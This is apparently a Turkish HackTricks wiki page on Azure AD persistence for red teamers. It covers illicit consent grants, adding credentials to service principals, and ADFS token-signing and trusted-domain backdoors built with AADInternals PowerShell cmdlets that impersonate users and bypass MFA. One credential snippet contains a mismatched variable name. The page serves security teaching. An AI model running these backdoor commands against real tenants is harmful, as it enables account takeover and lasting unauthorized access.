# Az - Kalıcılık

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

### Yasadışı Onay Verme

Varsayılan olarak, herhangi bir kullanıcı Azure AD'de bir uygulama kaydedebilir. Bu nedenle, hedef kiracı için yüksek etkili izinlere ihtiyaç duyan bir uygulama kaydedebilirsiniz (yönetici onayı ile onaylarsanız) - örneğin, bir kullanıcının adına posta gönderme, rol yönetimi vb. Bu, başarılı olması durumunda **çok verimli** olacak **saldırıları yürütmemize** izin verecektir.

Ayrıca, bu uygulamayı kendi kullanıcınızla kabul ederek erişimi sürdürmenin bir yolu olabilir.

### Uygulamalar ve Hizmet İlkeleri

Uygulama Yöneticisi, GA veya microsoft.directory/applications/credentials/update izinleri olan özel bir rol ile kimlik doğrulama bilgilerini (şifre veya sertifika) mevcut bir uygulamaya ekleyebiliriz.

Yüksek izinlere sahip bir uygulamayı hedef almak veya yüksek izinlere sahip yeni bir uygulama eklemek mümkündür.

Uygulamaya eklemek için ilginç bir rol **Ayrıcalıklı kimlik doğrulama yöneticisi rolü** olabilir çünkü bu, **Global Yöneticilerin şifresini sıfırlamaya** izin verir.

Bu teknik ayrıca **MFA'yı atlamaya** olanak tanır.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Sertifika tabanlı kimlik doğrulama için
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
### Federasyon - Token İmzalama Sertifikası

On-prem AD'de **DA ayrıcalıkları** ile, çok uzun bir geçerliliğe sahip olan **yeni Token imzalama** ve **Token Şifreleme sertifikaları** oluşturmak ve bunları içe aktarmak mümkündür. Bu, bize **ImmutableID'sini** bildiğimiz herhangi bir kullanıcı olarak **oturum açmamıza** izin verecektir.

Aşağıdaki komutu **ADFS sunucusunda DA olarak çalıştırın** yeni sertifikalar oluşturmak için (varsayılan şifre 'AADInternals'), bunları ADFS'e ekleyin, otomatik yenilemeyi devre dışı bırakın ve hizmeti yeniden başlatın:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Ardından, Azure AD ile sertifika bilgilerini güncelleyin:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federasyon - Güvenilen Etki Alanı

Bir kiracıda GA ayrıcalıklarıyla, **yeni bir etki alanı eklemek** mümkündür (doğrulanmış olmalı), kimlik doğrulama türünü Federasyon olarak yapılandırmak ve etki alanını **belirli bir sertifikaya güvenen** (aşağıdaki komutta any.sts) ve yayıncıyı yapılandırmak için:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Referanslar

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
